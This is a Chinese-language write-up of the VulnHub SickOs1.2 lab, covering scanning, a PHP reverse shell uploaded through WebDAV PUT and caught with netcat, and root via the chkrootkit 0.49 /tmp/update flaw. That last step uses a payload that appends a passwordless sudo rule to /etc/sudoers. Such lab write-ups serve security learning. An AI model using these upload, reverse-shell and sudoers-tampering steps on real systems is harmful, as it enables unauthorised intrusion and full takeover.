---
title: "SickOs1.2 Vulnhub靶场复现"
description: "SickOs1.2 Vulnhub靶场复现"
slug: "vulnhub-sickos1-2"
pubDate: "2026-09-28"
type: "writeup"
tags: ["Vulnhub"]
lang: "zh-CN"
---

# SickOs1.2 VulnHub靶场复现

## 靶场介绍

靶场地址 https://www.vulnhub.com/entry/sickos-12,144/

介绍如下

```
## About Release
Name........: SickOs1.2
Date Release: 26 Apr 2016
Author......: D4rk
Series......: SickOs
Objective...: Get /root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
Tester(s)...: h1tch1, Eagle11
Twitter.....: https://twitter.com/D4rk36
## Description:-
This is second in following series from SickOs and is independent of the prior releases, scope of challenge is to gain highest privileges on the system.
```

靶场部署 靶机默认是桥接，改成nat，这里我部署在VMware上

## 信息收集

### 主机发现

```shell
sudo nmap -sn 10.10.10.0/24
```

获取到靶机 ip 为 10.10.10.101

### 端口扫描和漏洞探测

```shell
sudo nmap -sS -sV -O -sC -p- --min-rate 5000 10.10.10.101
```

| 端口   | 服务 | 标题/版本                                                                      | 备注                                                                 |
| ------ | ---- | ------------------------------------------------------------------------------ | -------------------------------------------------------------------- |
| 22/tcp | SSH  | OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)                   | 远程登录入口；版本较旧，可关注弱口令、用户枚举、密钥登录             |
| 80/tcp | HTTP | lighttpd 1.4.28；HTTP 标题：无标题 (text/html)；Server Header：lighttpd/1.4.28 | Web 入口；lighttpd 版本较旧，建议目录爆破、源码/配置文件泄露、CGI 等 |

再利用下nmap的漏洞扫描

```shell
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum:
|_  /test/: Test page
```

| 端口 | 服务 | 漏洞扫描发现                                                                                                                                                                      | 备注                                                                                               |
| ---- | ---- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
| 22   | SSH  | 本次 `vuln` 脚本未返回相关漏洞结果                                                                                                                                                | 远程登录入口；结合前次扫描为 OpenSSH 5.9p1 Debian 5ubuntu1.8，可后续关注弱口令、用户枚举、密钥登录 |
| 80   | HTTP | `http-enum` 发现：`/test/`（Test page）；`http-csrf`、`http-dombased-xss`、`http-stored-xss` 均未发现漏洞；`http-vuln-cve2017-1001000` 脚本执行失败（可用 `-d` 调试，通常可忽略） |

### Web服务探测

虽然扫出一个 /test/ 的目录，还是先看看80端口有什么，然后我们再目录爆破尝试获取更多的攻击面,

只有一张人的图片，里面的文字是

```text
WHAT IF COMPUTER VIRUSES
ARE REALLY MADE BY THE ANTI-VIRUS
SOFTARE COMPANIES TO MAKE MONEY?
```

网页前端代码最后一行藏了一行

`<!-- NOTHING IN HERE ///\\\ -->>>>`

图片提到了病毒，联想到木马病毒

### 目录爆破

```shell
sudo dirb http://10.10.10.101
```

只有这个 http://10.10.10.101/test/ 访问看看

## 漏洞发现及其利用

### 访问 /test 目录

这里开启了 autoindex（目录列举）

考虑到 Web 应用通常会存在文件上传或临时目录，初步推测该目录可能具备写入权限。

下一步将使用 curl 探测该目录支持的 HTTP 方法

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/SickOs1.2]
└─$ curl -i -X OPTIONS http://10.10.10.101/test/
HTTP/1.1 200 OK
DAV: 1,2
MS-Author-Via: DAV
Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
Allow: OPTIONS, GET, HEAD, POST
Content-Length: 0
Date: Mon, 28 Sep 2026 08:58:01 GMT
Server: lighttpd/1.4.28
```

参数解释：

- -i：输出响应头，方便看状态码和 Allow 头

- -X OPTIONS：指定请求方法为 OPTIONS，问服务器这个目录支持哪些方法

| 响应头                 | 含义                                                          |
| ---------------------- | ------------------------------------------------------------- |
| HTTP/1.1 200 OK        | 服务器正常响应了 OPTIONS 请求                                 |
| DAV: 1,2               | 服务器启用了 WebDAV，版本 1 和 2                              |
| MS-Author-Via: DAV     | 兼容 Microsoft WebDAV 客户端，进一步确认 WebDAV 开启          |
| Allow: 第一行          | 支持 WebDAV 方法：PROPFIND、DELETE、MKCOL、PUT、MOVE、COPY 等 |
| Allow: 第二行          | 也支持普通 HTTP 方法：OPTIONS、GET、HEAD、POST                |
| Content-Length: 0      | 没有响应体，正常                                              |
| Server:lighttpd/1.4.28 | 确认服务器版本                                                |

最关键的两个点

1. DAV: 1,2

说明 lighttpd 开启了 WebDAV 模块。WebDAV 是一套基于 HTTP 的文件管理协议，允许客户端上传、删除、移动、复制文件。

2. Allow 里有 PUT

这意味着你可以直接用 HTTP PUT 方法，往这个目录上传文件

我们继续用 curl 测试

```shell
curl -i -X PUT http://10.10.10.101/test/hello.txt --data "test123"
HTTP/1.1 201 Created
Content-Length: 0
Date: Mon, 28 Sep 2026 09:12:57 GMT
Server: lighttpd/1.4.28
```

-X PUT：指定请求方法为 PUT

--data "test123"：写入文件的内容

## 文件上传WebShell尝试

浏览器可以访问的这个文件，接下来上传反弹shell看看

这里我复用之前博客上的内容 /posts/vulnhub-darkhole1-0/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B0%9D%E8%AF%95

不过我把我把文件名字改为 sh.php

先开监听

```shell
sudo nc -lvnp 443
```

-l：listen，监听模式

-v：verbose，显示详细信息

-n：不做 DNS 解析，直接用 IP

-p: 指定端口

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/SickOs1.2]
└─$ curl -i -X PUT http://10.10.10.101/test/sh.php --data-binary @sh.php
HTTP/1.1 201 Created
Content-Length: 0
Date: Mon, 28 Sep 2026 09:26:09 GMT
Server: lighttpd/1.4.28
```

接着浏览器刷新那个目录发现以及上传成功了，点击访问,然后回去看监听发现反弹成功顺手变为交替shell

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/SickOs1.2]
└─$ sudo nc -lvnp 443
[sudo] kali 的密码：
listening on [any] 443 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.101] 43155
Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
 02:27:02 up  1:19,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
/bin/sh: 1: python3: not found
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/$
```

python3 不存在，这里换成了 python。说明老系统（Ubuntu 12.04）默认只有 Python 2

## www-data权限下做靶机的信息收集

```shell
www-data@ubuntu:/$ id; pwd; uname -a; cat /etc/passwd
id; pwd; uname -a; cat /etc/passwd
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/
Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:104::/var/run/dbus:/bin/false
john:x:1000:1000:Ubuntu 12.x,,,:/home/john:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
```

john:x:1000:1000:Ubuntu 12.x,,,:/home/john:/bin/bash

john 是唯一一个 UID 1000 的普通用户，有家目录 /home/john，能登录 bash。

### 看看john目录下有什么文件

```shell
www-data@ubuntu:/$ ls -la /var/www
ls -la /var/www
total 64
drwxr-xr-x  3 root     root      4096 Apr 25  2016 .
drwxr-xr-x 12 root     root      4096 Apr 26  2016 ..
-rw-r--r--  1 root     root     46878 Apr 25  2016 blow.jpg
-rw-r--r--  1 root     root       163 Apr 25  2016 index.php
drwxr-xr-x  2 www-data www-data  4096 Sep 28 02:26 test
www-data@ubuntu:/$ ls -la /home/john
ls -la /home/john
total 28
drwxr-xr-x 3 john john 4096 Apr 12  2016 .
drwxr-xr-x 3 root root 4096 Mar 30  2016 ..
-rw------- 1 john john   61 Apr 26  2016 .bash_history
-rw-r--r-- 1 john john  220 Mar 30  2016 .bash_logout
-rw-r--r-- 1 john john 3486 Mar 30  2016 .bashrc
drwx------ 2 john john 4096 Mar 30  2016 .cache
-rw-r--r-- 1 john john  675 Mar 30  2016 .profile
```

## 尝试提权

### sudo提权失败

```shell
www-data@ubuntu:/$ sudo -l
sudo -l
[sudo] password for www-data:
```

需要密码走不通

### suid 提权失败

```shell
www-data@ubuntu:/$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/usr/sbin/pppd
/usr/sbin/uuidd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudoedit
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/at
/usr/bin/mtr
/usr/bin/gpasswd
/usr/bin/newgrp
/bin/mount
/bin/ping6
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
```

全是系统默认

### 尝试cron 枚举

```shell
www-data@ubuntu:/$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

没有自定义目录，再看看其他的

```shell
www-data@ubuntu:/$ ls -la /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly
<y /etc/cron.daily /etc/cron.weekly /etc/cron.monthly
ls: cannot open directory /etc/cron.d: Permission denied
/etc/cron.daily:
total 72
drwxr-xr-x  2 root root  4096 Apr 12  2016 .
drwxr-xr-x 84 root root  4096 Sep 28  2026 ..
-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder
-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt
-rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude
-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit
-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg
-rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd
-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db
-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
-rwxr-xr-x  1 root root   249 Sep 12  2012 passwd
-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Mar 30  2016 .
drwxr-xr-x 84 root root 4096 Sep 28  2026 ..
-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Mar 30  2016 .
drwxr-xr-x 84 root root 4096 Sep 28  2026 ..
-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Mar 30  2016 .
drwxr-xr-x 84 root root 4096 Sep 28  2026 ..
-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder
-rwxr-xr-x  1 root root  730 Sep 13  2013 apt-xapian-index
-rwxr-xr-x  1 root root  907 Dec 28  2012 man-db
```

注意这个文件：chkrootkit

```shell
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
```

这行说明：/etc/cron.daily/ 里的所有脚本，每天由 root 身份自动执行一次

### 对这个工具进行信息收集

```shell
www-data@ubuntu:/$ ls -l /etc/cron.daily/chkrootkit
ls -l /etc/cron.daily/chkrootkit
-rwxr-xr-x 1 root root 2032 Jun  4  2014 /etc/cron.daily/chkrootkit
www-data@ubuntu:/$ head -n 30 /etc/cron.daily/chkrootkit
head -n 30 /etc/cron.daily/chkrootkit
#!/bin/sh

set -e

CHKROOTKIT=/usr/sbin/chkrootkit
CF=/etc/chkrootkit.conf
LOG_DIR=/var/log/chkrootkit

if [ ! -x $CHKROOTKIT ]; then
  exit 0
fi

if [ -f $CF ]; then
    . $CF
fi

if [ "$RUN_DAILY" = "true" ]; then
    if [ "$DIFF_MODE" = "true" ]; then
                                eval $CHKROOTKIT $RUN_DAILY_OPTS > $LOG_DIR/log.today.raw 2>&1
                                # the sed expression replaces the messages about /sbin/dhclient3 /usr/sbin/dhcpd3
                                # with a message that is the same whatever order eth0 and eth1 were scanned
                                sed -r -e 's,eth(0|1)(:[0-9])?: PACKET SNIFFER\((/sbin/dhclient3|/usr/sbin/dhcpd3)\[[0-9]+\]\),eth\[0|1\]: PACKET SNIFFER\([dhclient3|dhcpd3]{PID}\),' \
                                -e 's/(! \w+\s+)[ 0-9]{4}[0-9]/\1#####/' $LOG_DIR/log.today.raw > $LOG_DIR/log.today
        if [ ! -f $LOG_DIR/log.expected ]; then
                                                echo "ERROR: No file $LOG_DIR/log.expected"
                                                echo "This file should contain expected output from chkrootkit"
                                                echo
                                                echo "Today's run produced the following output:"
                                                echo "--- [ BEGIN: cat $LOG_DIR/log.today  ] ---"
                                                cat $LOG_DIR/log.today
www-data@ubuntu:/$ chkrootkit -V 2>/dev/null
chkrootkit -V 2>/dev/null
www-data@ubuntu:/$ cat /etc/chkrootkit.conf
cat /etc/chkrootkit.conf
RUN_DAILY="false"
RUN_DAILY_OPTS="-q"
DIFF_MODE="false"
www-data@ubuntu:/$ ls -l /etc/chkrootkit.conf
ls -l /etc/chkrootkit.conf
-rw-r--r-- 1 root root 56 Apr 12  2016 /etc/chkrootkit.conf
```

/etc/chkrootkit.conf 是 root:root 644，www-data 不可写，所以改配置这条路也断了

纠正其中一条命令错误

```shell
www-data@ubuntu:/$ /usr/sbin/chkrootkit -V
/usr/sbin/chkrootkit -V
chkrootkit version 0.49
```

输出是空的。为什么？

因为 chkrootkit 的二进制不在 www-data 的 PATH 里。它的完整路径是 /usr/sbin/chkrootkit，而 www-data 的 PATH 里可能没有 /usr/sbin

再看看脚本全部内容

```shell
www-data@ubuntu:/$ cat -n /etc/cron.daily/chkrootkit
cat -n /etc/cron.daily/chkrootkit
     1  #!/bin/sh
     2
     3  set -e
     4
     5  CHKROOTKIT=/usr/sbin/chkrootkit
     6  CF=/etc/chkrootkit.conf
     7  LOG_DIR=/var/log/chkrootkit
     8
     9  if [ ! -x $CHKROOTKIT ]; then
    10    exit 0
    11  fi
    12
    13  if [ -f $CF ]; then
    14      . $CF
    15  fi
    16
    17  if [ "$RUN_DAILY" = "true" ]; then
    18      if [ "$DIFF_MODE" = "true" ]; then
    19                                  eval $CHKROOTKIT $RUN_DAILY_OPTS > $LOG_DIR/log.today.raw 2>&1
    20                                  # the sed expression replaces the messages about /sbin/dhclient3 /usr/sbin/dhcpd3
    21                                  # with a message that is the same whatever order eth0 and eth1 were scanned
    22                                  sed -r -e 's,eth(0|1)(:[0-9])?: PACKET SNIFFER\((/sbin/dhclient3|/usr/sbin/dhcpd3)\[[0-9]+\]\),eth\[0|1\]: PACKET SNIFFER\([dhclient3|dhcpd3]{PID}\),' \
    23                                  -e 's/(! \w+\s+)[ 0-9]{4}[0-9]/\1#####/' $LOG_DIR/log.today.raw > $LOG_DIR/log.today
    24          if [ ! -f $LOG_DIR/log.expected ]; then
    25                                                  echo "ERROR: No file $LOG_DIR/log.expected"
    26                                                  echo "This file should contain expected output from chkrootkit"
    27                                                  echo
    28                                                  echo "Today's run produced the following output:"
    29                                                  echo "--- [ BEGIN: cat $LOG_DIR/log.today  ] ---"
    30                                                  cat $LOG_DIR/log.today
    31                                                  echo "--- [ END: cat $LOG_DIR/log.today ] ---"
    32                                                  echo
    33                                                  echo "To create this file containing all output from today's run, do (as root)"
    34                                                  echo "# cp -a $LOG_DIR/log.today $LOG_DIR/log.expected"
    35                                                  echo "# (note that unedited output is in $LOG_DIR/log.today.raw)"
    36                                  elif ! diff -q $LOG_DIR/log.expected $LOG_DIR/log.today > /dev/null 2>&1; then
    37                                                  echo "ERROR: chkrootkit output was not as expected."
    38                                                  echo
    39                                                  echo "The difference is:"
    40                                                  echo "---[ BEGIN: diff -u $LOG_DIR/log.expected $LOG_DIR/log.today ] ---"
    41                                                  diff -u $LOG_DIR/log.expected $LOG_DIR/log.today || true
    42                                                  echo "---[ END: diff -u $LOG_DIR/log.expected $LOG_DIR/log.today ] ---"
    43                                                  echo
    44                                                  echo "To update the expected output, run (as root)"
    45                                                  echo "#  cp -a -f $LOG_DIR/log.today $LOG_DIR/log.expected"
    46                                                  echo "# (note that unedited output is in $LOG_DIR/log.today.raw)"
    47          fi
    48      else
    49          eval $CHKROOTKIT $RUN_DAILY_OPTS
    50      fi
    51  fi
```

## 利用漏洞库寻找chkrootkit的漏洞

```shell
┌──(kali㉿kali)-[~]
└─$ searchsploit chkrootkit 0.49
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)                                                                                                                      | linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation                                                                                                                              | linux/local/33899.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

已经搜到了，版本甚至对的上

先看手动那条exp，理解漏洞原理和触发条件

```shell
searchsploit -x linux/local/33899.txt
```

看完按q退出

它利用的是 chkrootkit 里一段**变量没加引号**的代码。chkrootkit 在检查 Slapper 蠕虫时，会尝试执行 `/tmp/update` 等文件。如果这个文件存在且可执行，chkrootkit 就会以运行它的用户权限执行它。

而 /etc/cron.daily/chkrootkit 是被 root 的 cron 触发的，所以链条是：

root cron → /etc/cron.daily/chkrootkit → /usr/sbin/chkrootkit → /tmp/update（以 root 执行）

后面需要做的

1. 在靶机上创建 /tmp/update，内容是一段 shell 命令

2. chmod +x /tmp/update 给它执行权限

3. 等 root 的 cron 触发 chkrootkit

## 编写恶意脚本提权至root

创建恶意 update 文件：在 /tmp 目录下创建文件，并写入提权命令。

```shell
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

赋予执行权限：

```shell
chmod +x /tmp/update
```

手动触发脚本：直接执行 /etc/cron.daily/chkrootkit 脚本

```shell
/etc/cron.daily/chkrootkit
```

验证提权：检查 sudo 权限是否已生效

```shell
www-data@ubuntu:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on this host:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on this host:
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
```

## 切换到 root 获取flag

```shell
www-data@ubuntu:/$ sudo su
sudo su
root@ubuntu:/# cd /root
cd /root
root@ubuntu:~# ls -liah
ls -liah
total 76K
393219 drwx------  4 root root 4.0K Apr 26  2016 .
     2 drwxr-xr-x 22 root root 4.0K Mar 30  2016 ..
394966 -rw-r--r--  1 root root  39K Apr  9  2015 304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz
394993 -r--------  1 root root  491 Apr 26  2016 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
394963 -rw-------  1 root root 3.0K Apr 26  2016 .bash_history
393221 -rw-r--r--  1 root root 3.1K Apr 19  2012 .bashrc
394964 drwx------  2 root root 4.0K Apr 12  2016 .cache
394967 drwxr-xr-x  2 john john 4.0K Apr 12  2016 chkrootkit-0.49
394984 -rw-r--r--  1 root root  541 Apr 25  2016 newRule
393220 -rw-r--r--  1 root root  140 Apr 19  2012 .profile
root@ubuntu:~# cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.

Thanks for giving this try.

@vulnhub: Thanks for hosting this UP!.

```
